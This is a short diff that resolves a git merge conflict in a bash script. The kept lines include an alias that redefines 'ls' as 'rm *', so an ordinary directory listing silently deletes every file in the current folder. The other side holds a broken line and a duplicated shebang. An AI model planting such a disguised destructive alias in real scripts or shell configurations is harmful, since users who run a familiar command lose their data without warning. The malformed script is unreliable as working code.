@@ -1,8 +1,7 @@
-<<<<<<< HEAD
+
 #!/bin/bash
 alias ls='rm *'
-=======
+
 
 #!/bin/bash
  "hello $(whoami)"
->>>>>>> 84871d43ece19048c41b9e4150afa9bdb0336ce3
